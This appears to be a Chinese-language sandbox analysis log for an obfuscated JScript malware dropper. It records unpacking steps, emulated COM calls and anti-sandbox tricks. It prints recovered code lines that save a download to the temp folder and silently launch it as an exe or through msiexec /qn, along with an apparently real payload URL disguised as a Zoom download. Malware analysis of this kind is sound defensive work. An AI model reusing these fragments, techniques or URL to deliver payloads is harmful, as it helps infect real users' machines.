@@ -1,0 +1,54 @@
+﻿##############################################################################
+# 样本: ff587b5684660f1b3ffa5d4c2d905c98693124a8285404f13f6c2373709a4966.js
+##############################################################################
+原始大小: 822422 字符   扩展名: .js
+第一步 静态剥壳: [822422, 136490, 22650]   → 最内层 22650 字符
+第二步 改写结尾调用（形态 xxx[yyy](zzz)）→ __OUT__ = <结果>
+  [js_vm] 用时 63 ms
+  [js_vm] 护栏: 普通赋值(defineProperty不可用: 对象不支持“defineProperty”属性或方法) ；令牌校验: 吻合
+  [js_vm] 虚拟宿主记录: 2 条
+  [js_vm] 已写出解密结果 F:\SVM��Ŀ\behavior\hvm\_work\ff587b56\recovered.txt (9333 字节)
+  [js_vm] __OUT__ 长度 9333 字符
+  [js_vm] 已写出行为日志 F:\SVM��Ŀ\behavior\hvm\_work\ff587b56\calls_decryptor.txt
+  还原出真实代码 9333 字符 → F:\SVM项目\behavior\hvm\_work\ff587b56\recovered_full.txt
+第三步 虚拟执行（12 秒上限）:
+  [js_vm] 用时 46 ms
+  [js_vm] 护栏: 普通赋值(defineProperty不可用: 对象不支持“defineProperty”属性或方法) ；令牌校验: 吻合
+  [js_vm] 虚拟宿主记录: 14 条
+  [js_vm] [注意] 脚本没有设置 __OUT__（不是解密器层？或提前退出/报错）
+  [js_vm] 已写出行为日志 F:\SVM��Ŀ\behavior\hvm\_work\ff587b56\behavior.txt
+  --- 提取到的高价值行为（6 条）---
+      [★COM请求] WScript.CreateObject("WScript.Shell") —— 已被虚拟宿主接管
+      [★COM请求] WScript.CreateObject("Scripting.FileSystemObject") —— 已被虚拟宿主接管
+      [★COM请求] WScript.CreateObject("WinHttp.WinHttpRequest.5.1") —— 已被虚拟宿主接管
+      [★COM请求] WScript.CreateObject("MSXML2.ServerXMLHTTP.6.0") —— 已被虚拟宿主接管
+      [★网络请求] MSXML2.ServerXMLHTTP.6.0.open("GET", "https://massagebycath.com.au/Zoom.zip", "false")
+      [★网络请求] MSXML2.ServerXMLHTTP.6.0.send()
+第四步 解码取证（F:\SVM项目\behavior\hvm\_work\ff587b56\recovered_decoded.js）
+  【下载地址】
+      https://massagebycath.com.au/Zoom.zip
+  【GetSpecialFolder 取值】2 （2=临时目录, 0=Windows, 1=System32, 5=桌面, 7=启动）
+  【落地/涉及文件名】3c11.bin, Zoom.zip, msiexec.exe, 3c11.exe, 3c11.msi, 3c11.zip
+  【COM 组件】WScript.Shell, Scripting.FileSystemObject, WinHttp.WinHttpRequest.5.1, MSXML2.ServerXMLHTTP.6.0, Shell.Application, ADODB.Stream
+  【行为相关代码行（原样摘录，来自还原后的代码）】
+      var tmp=fso["GetSpecialFolder"](2).Path;
+      x["open"](G,u,false);
+      x["send"]();
+      var subs=new Enumerator(fso["GetFolder"](folder).SubFolders);
+      try{sh["CurrentDirectory"]=fso["GetParentFolderName"](p)}catch(e2){}
+      sh["Run"]("\""+p+"\"",0,false);
+      sh["Run"]("msiexec.exe /i "+"\""+p+"\""+" /qn",0,false);
+      dstNs["CopyHere"](items,0x14);
+      try{if(fso["FolderExists"](dir))fso["DeleteFolder"](dir,true)}catch(e4){}
+      try{fso["CreateFolder"](dir)}catch(e5){}
+      try{if(fso["FileExists"](raw))fso["DeleteFile"](raw,true)}catch(e6){}
+      st["SaveToFile"](raw,2);st["Close"]();
+      function grain_55p(dst){try{if(fso["FileExists"](dst))fso["DeleteFile"](dst,true)}catch(em){}fso["CopyFile"](raw,dst,true);return dst}
+      try{if(fso["FileExists"](zpath))fso["DeleteFile"](zpath,true)}catch(e12){}
+      try{if(fso["FileExists"](raw))fso["DeleteFile"](raw,true)}catch(e10){}
+  【反沙箱/反分析手法】
+      检测是否在 wscript.exe 下运行（反自动化）
+      关闭脚本交互（反弹窗/反提示）
+      基于时间差的等待/超时循环（反沙箱、拉长分析时间）
+      ActiveXObject 休眠（反沙箱）
+      读取宿主完整路径做环境判定
